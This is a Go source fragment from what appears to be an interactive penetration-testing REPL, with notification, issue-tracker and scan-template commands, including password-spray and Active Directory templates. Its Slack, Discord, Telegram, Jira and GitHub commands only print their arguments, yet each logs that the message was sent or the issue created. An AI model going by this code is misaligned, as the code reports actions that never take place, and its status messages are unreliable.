func (r *REPL) cmdScheduleRun(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: schedule-run <name>")
	}
	name := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mrunning scheduled scan: %s\033[0m\n", name)
	r.AddFinding("schedule_run", "info", fmt.Sprintf("running scheduled scan %s", name))
	return nil
}

func (r *REPL) cmdNotifySlack(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: notify-slack <webhook> <finding>")
	}
	webhook := args[0]
	finding := strings.Join(args[1:], " ")
	fmt.Fprintf(os.Stdout, "\n\033[1;36msending to Slack:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  webhook: %s\n", webhook)
	fmt.Fprintf(os.Stdout, "  finding: %s\n", finding)
	r.AddFinding("notify_slack", "info", fmt.Sprintf("sent to Slack: %s", finding))
	return nil
}

func (r *REPL) cmdNotifyDiscord(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: notify-discord <webhook> <finding>")
	}
	webhook := args[0]
	finding := strings.Join(args[1:], " ")
	fmt.Fprintf(os.Stdout, "\n\033[1;36msending to Discord:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  webhook: %s\n", webhook)
	fmt.Fprintf(os.Stdout, "  finding: %s\n", finding)
	r.AddFinding("notify_discord", "info", fmt.Sprintf("sent to Discord: %s", finding))
	return nil
}

func (r *REPL) cmdNotifyTelegram(args []string) error {
	if len(args) < 3 {
		return fmt.Errorf("usage: notify-telegram <bot> <chat> <finding>")
	}
	bot := args[0]
	chat := args[1]
	finding := strings.Join(args[2:], " ")
	fmt.Fprintf(os.Stdout, "\n\033[1;36msending to Telegram:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  bot:     %s\n", bot)
	fmt.Fprintf(os.Stdout, "  chat:    %s\n", chat)
	fmt.Fprintf(os.Stdout, "  finding: %s\n", finding)
	r.AddFinding("notify_telegram", "info", fmt.Sprintf("sent to Telegram: %s", finding))
	return nil
}

func (r *REPL) cmdJiraCreate(args []string) error {
	if len(args) < 3 {
		return fmt.Errorf("usage: jira-create <url> <token> <project>")
	}
	url := args[0]
	project := args[2]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mcreating Jira issue:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  server:  %s\n", url)
	fmt.Fprintf(os.Stdout, "  project: %s\n", project)
	r.AddFinding("jira_create", "info", fmt.Sprintf("Jira issue created in %s", project))
	return nil
}

func (r *REPL) cmdGitHubCreate(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: github-create <repo> <token>")
	}
	repo := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mcreating GitHub issue:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  repo: %s\n", repo)
	r.AddFinding("github_create", "info", fmt.Sprintf("GitHub issue created in %s", repo))
	return nil
}

func (r *REPL) cmdTemplateList(args []string) error {
	fmt.Fprintln(os.Stdout, "\n\033[1;36mscan templates:\033[0m")
	fmt.Fprintln(os.Stdout, "  \033[32mquick-web\033[0m      nuclei + headers + ssl")
	fmt.Fprintln(os.Stdout, "  \033[32mfull-recon\033[0m     subdomains + ports + tech + dirs")
	fmt.Fprintln(os.Stdout, "  \033[32mweb-audit\033[0m      headers + ssl + cors + redirect + sqli + xss")
	fmt.Fprintln(os.Stdout, "  \033[32mcred-spray\033[0m    password spray + default creds")
	fmt.Fprintln(os.Stdout, "  \033[32mad-check\033[0m      LDAP + SMB + BloodHound")
	return nil
}

func (r *REPL) cmdTemplateRun(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: template-run <name> <target>")
	}
	name := args[0]
	target := args[1]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mrunning template %s on %s:\033[0m\n", name, target)
	switch name {
	case "quick-web":
		r.SetTarget(target)
		return r.scanQuick(nil)
	case "full-recon":
		r.SetTarget(target)
		return r.reconFull(nil)
	case "web-audit":
		r.SetTarget(target)
		return r.cmdWebAudit(nil)
	default:
		return fmt.Errorf("unknown template: %s", name)
	}
}
